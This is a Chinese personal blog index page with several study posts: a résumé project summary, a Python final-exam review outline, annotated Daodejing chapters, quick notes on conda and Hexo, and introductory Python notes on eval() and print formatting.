<p>技术栈: SpringBoot+ SpringCloud+ Redis + Kafka+XXL-Job+Vue.js+其他第三方SDK等<br>●将校内服务与百度地图结合实现信息视觉呈现;采用人脸识别打造安全机制，通过模型训练数据采集提供了智<br>能系统问<br>答服务<br>●对系统慢SQL进行优化，使得系统性能大幅度提高。<br>●用Redis存储登录ticket和验证码，解决分布式session问题<br>●定义热点数据并缓存在Redis,降低了数据库访问压力<br>●将校内服务与百度地图结合实现信息视觉呈现;采用人脸识别打造安全机制，通过模型训练数据采集提供了智<br>能系统问<br>答服务<br>●对热帖排行模块，使用分布式缓存Redis和本地缓存Caffeine作为多级缓存，避免了缓存雪崩，将QPS提升了<br>20倍<br>(10-200)，大大提升了网站访问速度。并使用Quartz定时更新热帖排行<br>●利用JVM指令排查出GC问题，调整JVM配置，降低GC次数使<br>●用Kafka打造强大的异步消息系统<br>version1.0可以公众号后台回复[基于人工智能的智慧校园助手]</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/06/66d03afcf0b4.html">测试</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-18</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/">culitivate</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/Python/">Python</a></span><div class="content"><h2 id="考试题型"><a href="#考试题型" class="headerlink" title="考试题型"></a>考试题型</h2><p>满分 100 分，考试题型如下：<br>（1）单选题（40 题，1 分&#x2F;题，共 40 分）<br>（2）多选题（20 题，1 分&#x2F;题，共 20 分）<br>（3）填空题（30 题，1 分&#x2F;题，共 30 分）<br>（4）判断题（10 题，1 分&#x2F;题，共 10 分）</p>
<h2 id="期末复习要点"><a href="#期末复习要点" class="headerlink" title="期末复习要点"></a>期末复习要点</h2><h3 id="第-1-章-Python-基本使用"><a href="#第-1-章-Python-基本使用" class="headerlink" title="第 1 章 Python 基本使用"></a>第 1 章 Python 基本使用</h3><ol>
<li>计算机编程语言 Python 的特点。</li>
<li>IDLE 的功能，如何调试程序。</li>
<li>变量和常量，赋值语句，单行注释和多行注释。</li>
<li>如何导入模块。</li>
<li>通用函数：input()、print()、len()、int()、eval()等。</li>
<li>专用函数：upper()、lower()等。</li>
</ol>
<h3 id="第-2-章-基本数据的表示"><a href="#第-2-章-基本数据的表示" class="headerlink" title="第 2 章 基本数据的表示"></a>第 2 章 基本数据的表示</h3><ol>
<li>变量的命名规则与使用，Python 的保留字。</li>
<li>整数、浮点、字符串和布尔型数据，类型的判断及之间的转换。str() float() bool() int()</li>
<li>复数类型的表示，转义符的用法。</li>
<li>各种运算符及其优先级，Python 的书写规则。</li>
<li>不同进制数的表示及转换。</li>
<li>常用函数：type()、chr()、ord()、format()等。</li>
</ol>
<h3 id="第-3-章-控制语句"><a href="#第-3-章-控制语句" class="headerlink" title="第 3 章 控制语句"></a>第 3 章 控制语句</h3><ol>
<li>表达式的计算，常用运算符，全局变量。</li>
<li>顺序结构、单分支&#x2F;多分支结构、分支嵌套结构的程序设计。</li>
<li>for&#x2F;while 循环结构、多重循环、分支和循环嵌套的程序设计。</li>
<li>循环结构中 else 子句的用法，死循环的概念及中断。</li>
<li>break 和 continue 保留字的功能。</li>
<li>异常处理：基本语句结构，else 和 finally 子句的用法。</li>
<li>常用函数：input()、print()、range()、chr()、ord()、eval()、int()等。</li>
</ol>
<h3 id="第-4-章-函数与模块"><a href="#第-4-章-函数与模块" class="headerlink" title="第 4 章 函数与模块"></a>第 4 章 函数与模块</h3><ol>
<li>函数的定义和使用<br>（1）使用函数的优点。<br>（2）函数的分类（内置函数和用户自定义函数）。<br>（3）用户自定义函数的格式。</li>
<li>函数参数<br>（1）实参、形参的含义。(当我们调用函数时，需要向函数传递一些参数，这些参数称为实参（arguments），它们是函数调用时传入的具体值。而函数定义时声明的参数称为形参（parameters），它们是函数定义时指定的占位符变量，用于将函数调用时传入的实参接收并进行处理。)<br>（2）函数调用时参数传递有哪些方式（位置传参、默认参数、关键字传参），能通过实例进行判别。<br>（3）可变参数的定义方式（*和**运算符的作用）。( *args 来定义可变参数，表示该函数可以接收任意数量的位置参数。**kwargs 来定义可变参数，表示该函数可以接收任意数量的关键字参数。)<br>（4）return 语句的属性（位置、数量特点）。(return 语句用于结束函数并返回结果，在 Python 中可以出现在函数的任意位置，函数也可以有多个 return 语句，但只有一个执行。如果 return 语句后面没有跟值，或者 return 语句缺失，则函数返回 None。)</li>
<li>变量的作用域<br>（1）全局变量的含义（能通过实例辨别）、特点，声明全局变量的关键字。(声明全局变量的关键字是 global。如果需要在函数内部修改全局变量的值，必须使用 global 关键字来声明该变量是全局变量，否则 Python 将会把它视为函数内部新定义的一个局部变量。)<br>（2）局部变量的含义、特点。</li>
<li>匿名函数和递归函数<br>（1）匿名函数的特征（本质是一个表达式）。<br>（2）定义匿名函数的关键字、格式。(使用 lambda 关键字来创建函数对象,<code>lambda 参数列表: 表达式</code>)<br>（3）递归函数的概念及代码。</li>
<li>内置函数<br>（1）辨别常用的内置函数。<br>（2）常用函数：print()、range()、split()、list()、min()、max()、reverse()、int()、str()、ord()、chr()、eval()、append()、sorted()、input()等。<br>（3）time 库：time()、gmtime()、localtime()、ctime()、mktime()、strftime()、strptime()、perf_counter()、sleep()等。<br>2.计算生态。<br>（1）pip 库。三种安装方式（工具安装、自定义安装、文件安装）。<br>（2）PyInstaller 库。参数：Python 源程序文件名、-F、-i、-D、-clean 的功能。<br>（3）jieba 库。中文分词库，三种分词模式（精确模式 jieba.lcut(s)、全模式 jieba.lcut(s,cut_all&#x3D;True)、搜索引擎模式 jieba.lcut_for_search(s)）。<br>（4）wordcloud 库。创建 WordCloud 对象、generate(text)方法、to_file(filename)方法。<br>（5）NumPy 库的简单使用。numpy.array()函数、numpy.arange()函数。<br>（6）第三方库纵览（只要求了解第三方库的名称及分类）</li>
</ol>
<ul>
<li>数据分析：numpy、pandas、scipy</li>
<li>文本处理：beautifulsoup4、pdfminer、python-docx、openpyxl</li>
<li>数据可视化：matplotlib、TVTK、mayavi、seaborn</li>
<li>机器学习：TensorFlow、scikit-learn、Theano、mxnet、PyTorch</li>
<li>网络爬虫：requests、scrapy、grab</li>
<li>Web 开发：Django、Pyramid、Flask</li>
<li>图形用户界面：PyQt5、wxPython、PyGTK</li>
<li>游戏开发：Pygame、Panda3D、Cocos2d</li>
</ul>
<p>（7）更多第三方库:</p>
<ul>
<li>PIL：图像处理方面的重要第三方库</li>
<li>SymPy：支持符号计算，是一个全功能的计算机代数系统</li>
<li>NLTK：自然语言处理的第三方库</li>
<li>WeRoBot：微信机器人框架</li>
<li>MyQR：产生基本二维码、艺术二维码、动态效果二维码</li>
<li>Loso：另一种中文分词库</li>
<li>SnowNLP：情感分析</li>
</ul>
<h3 id="第-6-章-组合数据"><a href="#第-6-章-组合数据" class="headerlink" title="第 6 章 组合数据"></a>第 6 章 组合数据</h3><ol>
<li>组合数据的类型与表示，序列的类型。</li>
<li>序列（含字符串）的索引与切片，列表的复制与引用。</li>
<li>常用函数：list()、range()、len()、max()、format()、sorted()、input()、eval()、type()、chr()、ord()等。</li>
<li>列表函数（方法）：append()、index()、copy()、reverse()、insert()、pop()、clear()等。</li>
<li>字典函数（方法）：keys()、items()、pop()、popitem()、get()、update()等。</li>
</ol>
<h3 id="第-7-章-数据文件"><a href="#第-7-章-数据文件" class="headerlink" title="第 7 章 数据文件"></a>第 7 章 数据文件</h3><ol>
<li>文件类型：文本和二进制，文本文件的编码（中英文的 UTF-8 编码表示）。</li>
<li>文件指针：文本不同打开方式时指针的位置。</li>
<li>文件打开、读写和关闭。</li>
<li>常用函数和方法：open()、close()、read([size])、readline()、readlines()、write()、writelines()、tell()、seek()等。</li>
<li>目录路径概念，os 模块的 rename()、getcwd()、remove()、mkdir()的作用。</li>
<li>一维数据、二维数据和高维数据的特点、存储方式和表示形式。</li>
<li>采用 CSV 格式对一维和二维数据文件的读写。</li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/06/2eaba3ee2658.html">No title</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-13</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/">课程笔记</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E8%AF%AD%E6%96%87/">大学语文</a></span><div class="content"><h1 id="道德经"><a href="#道德经" class="headerlink" title="道德经"></a>道德经</h1><p>   </p>
<h2 id="二章"><a href="#二章" class="headerlink" title="二章"></a>二章</h2><p><strong>原文：</strong></p>
<p>天下皆知美之为美，斯恶已。皆知善之为善，斯不善已。故有无相生，难易相成，长短相形，高下相盈，音声相和，前后相随。恒也。是以圣人处无为之事，行不言之教。万物作焉而弗始。生而弗有，为而弗恃，功成而弗居。夫唯弗居，是以不去。</p>
<p><strong>提示：</strong><br>这一章分为两部分：第一部分，通过“美”、“善”，引申“有无”、“难易”、“长短”、“前后”，说明矛盾的对立与统一，及其相互影响、相互关联、和相互依存的关系；第二部分，要求人们按自然规律办事，不妄为、不过分苛求。</p>
<p><strong>解读：</strong></p>
<p>“天下皆知美之为美，斯恶已。”当天下都知道美的时候，那么，丑的观念也就产生了（“恶”，指丑）。</p>
<p>“皆知善之为善，斯不善已。”都知道善的时候，那么，不善的观念也就产生了。</p>
<p>“故有无相生，难易相成，长短相形，高下相盈，音声相和，前后相随。”因此，有无在对立中生成，难易在对立中形成，长短在对立中显现，高下（低）在对立中区分，音（乐）声（音）在对立中和谐，前后在对立中分别。</p>
<p>“恒也。”这是永恒不变的法则。</p>
<p>“是以圣人处无为之事，行不言之教。”所以，圣人用自然的法则——“无为”对待世事，用不言的方式施行教化。</p>
<p>“万物作焉而弗始。”任万物生长不加干预。</p>
<p>“生而弗有，为而弗恃，功成而弗居。”生养万物不据为私有，哺育万物不求报答，成就万物而不居功。</p>
<p>“夫唯弗居，是以不去。”因为其不居功，所以，业绩永存。</p>
<p>（注：“无为”是老子所用的一个特定概念。它指的是按自然规律办事，不是无所作为，而是不妄为。</p>
<h2 id="三章"><a href="#三章" class="headerlink" title="三章"></a>三章</h2><p><strong>原文：</strong></p>
<p>不尚贤，使民不争；不贵难得之货，使民不为盗；不见可欲，使民心不乱。是以圣人之治也，虚其心，实其腹，弱其志，强其骨。恒使民无知无欲。使夫智者不敢为也。为无为，则无不治矣。</p>
<p><strong>提示：</strong></p>
<p>这一章，讲的是如何治国的问题。在老子看来，要使国家安定，最根本的是要解决好社会矛盾。“尚贤”、“贵难得之货”、“见可欲”，都是容易引起社会动乱的动因。老子认为，解决这一问题最好的办法是“无为”。</p>
<p><strong>解读：</strong></p>
<p>“不尚贤，使民不争；不贵难得之货，使民不为盗；不见可欲，使民心不乱。”不去推崇重用那些有才干的能人，民众就不会为此去争名夺利；不贵重那些难得的东西，民众就不会去偷盗；看不到（不显露）可引起贪欲的东西，民众就不会产生欲望。</p>
<p>“是以圣人之治也，虚其心，实其腹，弱其志，强其骨。”所以，圣人的治理方法是：淡化他的心理（欲望），解决他的温饱，减低他的志向，强壮他的身体。</p>
<p>“恒使民无知无欲。”使百姓永远不会去奇思妙想，有过分的欲望。</p>
<p>“使夫智者不敢为也。”使那些有心智的人不敢妄为。</p>
<p>“为无为，则无不治也。”按照“无为”的方法去治理，那么，就没有什么治理不好的</p>
<h2 id="二十二章"><a href="#二十二章" class="headerlink" title="二十二章"></a>二十二章</h2><p><strong>原文：</strong></p>
<p>曲则全，枉则直，洼则盈，敝则新，少则得，多则惑。是以圣人抱一为天下式。不自见，故明；不自是，故彰；不自伐，故有功；不自矜，故长。夫唯不争，故天下莫能与之争。古之所谓“曲则全”者，岂虚言哉！诚全而归之。</p>
<p><strong>提示：</strong></p>
<p>这一章老子以“正反璧合”的方式，论述矛盾相互转化的辩证关系。以委屈，反而能保全；低凹，反而能积满；少取，反而能有得的道理，说明矛盾的两面性。并提出以“道”，作为观天下的规范。</p>
<p><strong>解读：</strong></p>
<p>“曲则全，枉则直，洼则盈，敝则新，少则得，多则惑。”<br>委屈反而能保全，弯曲反而能伸展，低洼之处反而能充盈，破旧反而能产生崭新，少取反而能多得，贪多反而会迷惑。</p>
<p>“是以圣人抱一为天下式。”<br>所以，圣人以“道”作为观察天下的范式。</p>
<p>“不自见，故明；不自是，故彰；不自伐，故有功；不自矜，故长。”<br>不自我显示（表现），反而能显明；不自以为是，反而能显著；不自己夸赞，反而能有功劳；不自我骄傲，反而能长久。</p>
<p>“夫唯不争，故天下莫能与之争。”<br>正因为他不与别人相争，所以天下没有人能与他争。</p>
<p>“古之所谓‘曲则全’者，岂虚言哉！诚全而归之。”<br>古时所说“委屈反而能保全”的话，怎么会是空话呢？它实实在在能够达到。</p>
<h2 id="六十三章"><a href="#六十三章" class="headerlink" title="六十三章"></a>六十三章</h2><p><strong>原文：</strong></p>
<p>为无为，事无事，味无味。大小，多少，报怨以德。图难于其易，为大于其细。天下难事，必作于易；天下大事，必作于细。是以圣人终不为大，故能成其大。夫轻诺必寡信，多易必多难。是以圣人犹难之，故终无难矣。</p>
<p><strong>提示：</strong></p>
<p>这一章讲的是圣人的处事原则。</p>
<p><strong>解读：</strong></p>
<p>“为无为，事无事，味无味。”<br>以“无为”的态度去作为，以“无事”的方式去做事，把恬淡无味当作味。</p>
<p>“大小，多少，报怨以德。”<br>大生于小，多起于小，用恩德去报答别人的仇怨。</p>
<p>“图难于其易，为大于其细。”<br>解决困难的事从它容易的地方入手，做大事要从细小的地方入手。</p>
<p>“天下难事，必作于易；天下大事，必作于细。”<br>天下的难事，必须从容易的地方做起；天下的大事，必须从细微的地方着眼。</p>
<p>“是以圣人终不为大，故能成其大。”<br>因此，圣人不自以为在干大事情，所以，才能做成大事。</p>
<p>“夫轻诺必寡信，多易必多难。”<br>轻易许诺必然很少守信用，把事情看得过分容易必然带来更多的困难。</p>
<p>“是以圣人犹难之，故终无难矣。”<br>因此，圣人尚且把事看得困难，所以，终究没有困难。</p>
<h2 id="七十七章"><a href="#七十七章" class="headerlink" title="七十七章"></a>七十七章</h2><p><strong>原文：</strong></p>
<p>天之道，其犹张弓欤？高者抑之，下者举之；有余者损之，不足者补之。天之道，损有余而补不足。人之道则不然，损不足而奉有余。孰能有余以奉天下，唯有道者。是以圣人为而不恃，功成而不处，其不欲见贤。</p>
<p><strong>提示：</strong></p>
<p>这一章讲的是“天道”与“人道”的区别。说明“天道”，近“道”；“人道”，远“道”。</p>
<p><strong>解读：</strong></p>
<p>“天之道，其犹张弓欤？”指自然的法则，就像拉弓射箭一样。</p>
<p>“高者抑之，下者举之；有余者损之，不足者补之。”偏高就放低一点，偏低就举高一些；拉得过满就放松一点，用力不足就加强一些。</p>
<p>“天之道，损有余而补不足。”自然的法则，是减去过剩补充不足。</p>
<p>“人之道则不然，损不足而奉有余。”人的法则则不是这样，是减去不够供奉给有余。</p>
<p>“孰能有余以奉天下，唯有道者。”谁能把有余的奉献给天下，只有尊循“道”的人。</p>
<p>“是以圣人为而不恃，功成而不处，其不欲见贤。”所以，有“道”的圣人有奉献不自恃有功，有成就而不自居，因为他不愿去表现自己的无私。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/06/249c515e01aa.html">速记</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-08</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E9%80%9F%E8%AE%B0/">速记</a></span><div class="content"><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/387408041">https://zhuanlan.zhihu.com/p/387408041</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_52529907/article/details/127136072">(108条消息) Windows10 安装 WSL2_windows10 wsl2_一个默默无闻的小程序员的博客-CSDN博客</a></p>
<h1 id="系统镜像文件"><a href="#系统镜像文件" class="headerlink" title="系统镜像文件"></a>系统镜像文件</h1><p><a target="_blank" rel="noopener" href="https://next.itellyou.cn/Original/Index?id=7ab5f0cb-7607-4bbe-9e88-50716dc43de6#cbp=Product?ID=6f677346-0a09-43fa-b60d-e878ed7625a0">https://next.itellyou.cn/Original/Index?id=7ab5f0cb-7607-4bbe-9e88-50716dc43de6#cbp=Product?ID=6f677346-0a09-43fa-b60d-e878ed7625a0</a></p>
<p>查看环境<br>conda info –envs</p>
<p>激活环境<br>activate envs</p>
<p>退出当前环境<br>deactivate envs</p>
<ul>
<li>删除环境</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda remove -n 环境名 --all</span><br></pre></td></tr></table></figure>

<p>创建环境<br>conda create  -n envname python&#x3D;versionnumber</p>
<p>教务系统官网<br>\<a target="_blank" rel="noopener" href="https://jwxt.nufe.edu.cn/student/login">https://jwxt.nufe.edu.cn/student/login</a></p>
<p>联网<br><a target="_blank" rel="noopener" href="http://10.200.253.5/">上网登录页</a></p>
<p>姚的记录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">【南京人力资源和社会保障学会】：报名2023年下半年企业人力资源管理师、劳动关系协调员、企业人力资源管理师（劳务派遣管理员）考试的同志（机构报名的学员由机构统一送交审核材料）请于10月7日—10月17日(周末正常审核)上午9:00-11:30 下午13:30-16:30携带以下资料前往鼓楼区管家桥55号（南京市职业技能培训中心）三楼301教室进行资格审核，通过人员现场缴纳费用（支付宝、现金）  </span><br><span class="line">现场审验纸质材料：（初考人员以下1、2、3项需要提供原件及复印件，第4项手工填写，其余项提供打印件即可。补考人员只需携带身份证原件及复印件，现场填写职业技能认定个人登记表。）  </span><br><span class="line">1、身份证（或军官证、护照、港澳台通行证。驾驶证和医保卡除外）  </span><br><span class="line">2、学历证书（学历证书、学信网学历证书电子注册备案表，电子注册备案表有效期选择6个月。）  </span><br><span class="line">（1）国内学历：提交全国高等学校学生信息咨询与就业指导中心出具的《中国高等教育学历认证报告》或学信网的电子注册备案表；  </span><br><span class="line">（2）国内学位：提交教育部学位与研究生教育发展中心出具的《认证报告》或江苏省大学生信息服务中心出具的《江苏省学位证书认证报告》；  </span><br><span class="line">（3）国（境）外学历学位：提交教育部留学服务中心出具的《国外学历学位认证书》；  </span><br><span class="line">（4）党校、军校院校取得的学历：提交档案保管部门签章确认的《毕业生登记表》；  </span><br><span class="line">（5）高中学历：提交毕业证书  </span><br><span class="line">（6）在校生（含自考未毕业）：出具学校开具的相关证明  </span><br><span class="line">3、现职业证书。（考四级证书的人员无需提供现职业证书）  </span><br><span class="line">4、工作年限承诺书（固定模板见申报通知附件3,承诺书填写部分全部手工填写。）  </span><br><span class="line">5、申报人员现场填写（职业技能认定个人登记表）  </span><br><span class="line">6、请涉及到工作年限的报名人员，需提供相对应的社保缴纳证明  </span><br><span class="line">7、证明已完成江苏人社线上平台实名注册认证的截图</span><br></pre></td></tr></table></figure>

<p>同步博客流程</p>
<ol>
<li><p>创建新文件</p>
</li>
<li><p>填充title</p>
</li>
<li><p>hexo g (生成静态页面)</p>
</li>
<li><p>hexo s（预览，可省）</p>
</li>
<li><p>hexo d(上传)</p>
</li>
<li><p>搜索用例图</p>
</li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/06/5e45197842b8.html">No title</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-08</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/">culitivate</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/Python/">Python</a></span><div class="content"><h1 id="第一章-基本知识"><a href="#第一章-基本知识" class="headerlink" title="第一章 基本知识"></a>第一章 基本知识</h1><h2 id="1-1命名字与保留字"><a href="#1-1命名字与保留字" class="headerlink" title="1.1命名字与保留字"></a>1.1命名字与保留字</h2><p>Python 语言允许采用大写字母、小写字母、数字、<br>组合给变量命名，但&#x3D;&#x3D;名字的首字符不能是数字，中间不空格&#x3D;&#x3D;,长度无限制。<br>注意：标识符，保留字对大小写敏感:python3中可以采用中文等非英语语言字符对变量命名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">33个保留字列表</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/c91c5b5ceb8e435594b3eb1e14e0fa7f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP5rGQfg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="1-2字符串"><a href="#1-2字符串" class="headerlink" title="1.2字符串"></a>1.2字符串</h2><p>字符串包括:正向递增系列和反向递减系列</p>
<ol>
<li>正向递增系列以最左侧字符序号为&#x3D;&#x3D;0&#x3D;&#x3D; 向右依次递增,最右侧序号为 &#x3D;&#x3D;L-1&#x3D;&#x3D;</li>
<li>反向递减系列以最右侧字符序号为 &#x3D;&#x3D;-L&#x3D;&#x3D; 向左依次递减,最左侧序号为 &#x3D;&#x3D;-L&#x3D;&#x3D;</li>
<li>字符串区间访问方式,[N:M]格式,表示字符串中从N到M &#x3D;&#x3D;(不包含M)&#x3D;&#x3D; 的子字符串<br> 例:s[-1]表示字符串s最后一个字符串;s[0:-1]表示从0到最后一个字符串 &#x3D;&#x3D;(不包含最后一个字符)&#x3D;&#x3D;</li>
</ol>
<h2 id="1-3赋值语句"><a href="#1-3赋值语句" class="headerlink" title="1.3赋值语句"></a>1.3赋值语句</h2><ol>
<li>&#x3D; 表示赋值,右值赋值左变量</li>
<li>同步复制语句<br> &lt;变量1&gt;,…,&lt;变量N&gt; &#x3D; &lt;表达式1&gt;,…,&lt;表达式N&gt;<br> 首先运行表达式N,并赋值给变量N<br> 好处: &#x3D;&#x3D;互换变量&#x3D;&#x3D; 不需要中间值,如:x,y&#x3D;y,x</li>
</ol>
<h2 id="1-4-eval-函数-去掉最外层引号"><a href="#1-4-eval-函数-去掉最外层引号" class="headerlink" title="1.4 eval()函数 去掉最外层引号"></a>1.4 eval()函数 去掉最外层引号</h2><p>例如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;s=&quot;102C&quot;</span><br><span class="line">&gt;&gt;&gt;eval(s[0:-1])</span><br><span class="line">102</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;输入”‘hello’”时,eval()去掉最外层引号后.结果为字符串’hello’&#x3D;&#x3D;<br>输入数字运算时,可搭配input()使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;s=eval(input(&quot;请输入一个数字: &quot;))</span><br><span class="line">请输入一个数字: 10024.256</span><br><span class="line">&gt;&gt;&gt;print(s*2)</span><br><span class="line">2048.512</span><br></pre></td></tr></table></figure>

<p>用于执行存储在字符串中的表达式<br>eval(expression, globals&#x3D;None, locals&#x3D;None)<br>expression 是一个字符串，表示要执行的 Python 表达式。<br>globals（可选）是一个字典，表示全局命名空间。如果提供了该参数，则在表达式求值时使用该命名空间中的变量和函数。<br>locals（可选）是一个字典，表示局部命名空间。如果提供了该参数，则在表达式求值时使用该命名空间中的变量和函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">1</span></span><br><span class="line">b=<span class="number">2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    x = <span class="number">10</span></span><br><span class="line">    y = <span class="number">20</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">locals</span>())     <span class="comment"># 局部</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">globals</span>())    <span class="comment"># 全局</span></span><br><span class="line">foo()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">10</span></span><br><span class="line">y = <span class="number">5</span></span><br><span class="line">expression = <span class="string">&quot;x * y&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(expression))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;1,2,3&#x27;</span>)</span><br><span class="line">out:</span><br><span class="line">(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>


<h2 id="1-5-print-输出函数"><a href="#1-5-print-输出函数" class="headerlink" title="1.5 print() 输出函数"></a>1.5 print() 输出函数</h2><p>纯信息输出时 print(&lt;带输出字符串&gt;)<br>格式化输出时 print()函数用槽格式,通过format()函数将输出变量格式化输出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">1</span></span><br><span class="line">b=<span class="number">2</span></span><br><span class="line">c=<span class="number">3</span></span><br><span class="line">a,b,c=c,b,a</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a is&quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;wdwd<span class="subst">&#123;a&#125;</span>wdaw<span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;teh&#123;&#125;wda&#123;&#125;&quot;</span>.<span class="built_in">format</span>(a,b))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;wd %d wd %d&quot;</span>%(a,b))</span><br></pre></td></tr></table></figure>
<p>格式化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">1.3323</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a:<span class="subst">&#123;a:<span class="number">.2</span>f&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a:&#123;:.2f&#125;&quot;</span>.<span class="built_in">format</span>(a))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a:%.2f&quot;</span>%(a))</span><br></pre></td></tr></table></figure>
<p>左右对齐<br>a&#x3D;123456789<br>b&#x3D;84868<br>print(f”a:{a}\nb:{b:&gt;6}”)<br>print(f”a:{a}\nb:{b:&lt;8}”)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">123456789</span></span><br><span class="line">b = <span class="string">&quot;*&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;0:&#123;2&#125;&gt;&#123;1&#125;,&#125;\n&#123;0:&#123;2&#125;^&#123;1&#125;,&#125;\n&#123;0:&#123;2&#125;&lt;&#123;1&#125;,&#125;&quot;</span>.<span class="built_in">format</span>(a,<span class="number">20</span>,b))</span><br><span class="line">out:</span><br><span class="line">*********<span class="number">123</span>,<span class="number">456</span>,<span class="number">789</span> </span><br><span class="line">****<span class="number">123</span>,<span class="number">456</span>,<span class="number">789</span>***** </span><br><span class="line"><span class="number">123</span>,<span class="number">456</span>,<span class="number">789</span>*********</span><br></pre></td></tr></table></figure>

<p>print “a”<br>SyntaxError: Missing parentheses in call to ‘print’. Did you mean print(…)?</p>
<h2 id="1-6-进制"><a href="#1-6-进制" class="headerlink" title="1.6 进制"></a>1.6 进制</h2><p>前缀<br>二进制 0b<br>八进制 0o<br>十六进制 0x</p>
<p>浮点数没有各种进制表示</p>
<p>int(‘23’,16)#表示将23看成16进制</p>
<p>输出特点格式</p>
